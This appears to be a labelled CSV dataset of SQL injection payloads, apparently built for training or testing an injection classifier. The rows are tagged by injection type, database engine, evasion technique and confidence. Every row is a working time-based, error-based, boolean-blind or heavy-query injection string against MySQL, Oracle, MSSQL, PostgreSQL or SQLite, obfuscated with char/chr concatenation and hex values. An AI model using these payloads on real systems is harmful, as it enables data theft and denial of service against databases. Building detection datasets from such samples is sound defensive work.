payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1'+ ( select 'yzxc' where 5230 = 5230 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""dppw"" like ""dppw",heavy_query,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""ulfr"" like ""ulfr",time_blind,oracle,case_variation|function_alternative,0.51,rule,sqliv2_csv,unknown
1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'smrw' like 'smrw,error_based,oracle,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'acly' like 'acly",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""nwzu"" like ""nwzu",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""hkjm"" like ""hkjm",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'dpdz' like 'dpdz",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv2_csv,unknown
-3100' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'etuj' like 'etuj,error_based,oracle,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1%' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( '%' = '",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""wjhj"" = ""wjhj",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) as yekp where 3049 = 3049 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""cneo"" like ""cneo",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1 ) ) as ambt where 5198 = 5198 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'abcf' like 'abcf",error_based,oracle,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" ) where 2834 = 2834 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1%' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""bxcb"" like ""bxcb",error_based,mssql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( 'mmvf' like 'mmvf,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""mrsl"" = ""mrsl",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv2_csv,unknown
"1 ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""mxnj"" like ""mxnj",error_based,postgresql,case_variation|function_alternative,0.41,rule,sqliv2_csv,unknown
"1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""xnsj"" like ""xnsj",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv2_csv,unknown
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'tpih' = 'tpih",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) waitfor delay '0:0:5' and ( ""hhzy"" like ""hhzy",time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""menm"" like ""menm",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'tmdj' like 'tmdj",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"-3501"" ) ) ) or ( 6789 = 6990 ) *6990 and ( ( ( ""jnnc"" like ""jnnc",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and '%' = '",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
-5026' or ( 8459 = 8459 ) *4906 and 'uavj' like 'uavj,unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""gimc"" like ""gimc",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv2_csv,unknown
"1%"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""%"" = """,unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv2_csv,unknown
"-5230"" ) or elt ( 1032 = 1032,3623 ) and ( ""aivb"" like ""aivb",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'nbzf' like 'nbzf,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"waitfor delay '0:0:5' and ( ""ludp"" like ""ludp",time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""lxue"" like ""lxue",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
"1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""tbbk"" like ""tbbk",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""oohx"" like ""oohx",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'wmoo' like 'wmoo",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1 ) as qjbd where 2808 = 2808 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
end and ( ( 'eqoc' like 'eqoc,unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'jjxn' = 'jjxn",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'cimm' like 'cimm",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
"-6561"" ) ) ) or 6872 = 6872 and ( ( ( ""azqp"" like ""azqp",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) and elt ( 9041 = 6421,6421 ) and ( ( ( 'ixxg' like 'ixxg",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'scye' like 'scye",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv2_csv,unknown
"1"" ) ) as kmss where 3214 = 3214 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""imlq"" like ""imlq",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1' ) ) or sleep ( 5 ) and ( ( 'uzhd' like 'uzhd,time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""xeki"" like ""xeki",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""%"" = """,unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""gydr"" like ""gydr",time_blind,oracle,case_variation|function_alternative,0.51,rule,sqliv2_csv,unknown
"1%"" ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1"" and sleep ( 5 ) and ""tdid"" like ""tdid",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
1' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 'czqk' like 'czqk,unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv2_csv,unknown
"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'ujjr' = 'ujjr",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1' ) as dvoy where 7906 = 7906 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""weku"" like ""weku",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"-5616"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""hdrb"" like ""hdrb",error_based,mssql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" ) ) and 7533 = 7533 and ( ( ""rnni"" like ""rnni",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
-2307' ) ) ) or 6872 = 6872 and ( ( ( 'fyok' like 'fyok,boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
end and ( 'rlux' like 'rlux,unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( 'hhlq' like 'hhlq,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 'pmzp' like 'pmzp",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""epfg"" like ""epfg",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1 ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""qwdi"" = ""qwdi",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( 'dcys' like 'dcys,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1%"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"end and ""xouo"" like ""xouo",unknown,unknown,function_alternative,0.0,rule,sqliv2_csv,unknown
"1' where 1836 = 1836 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
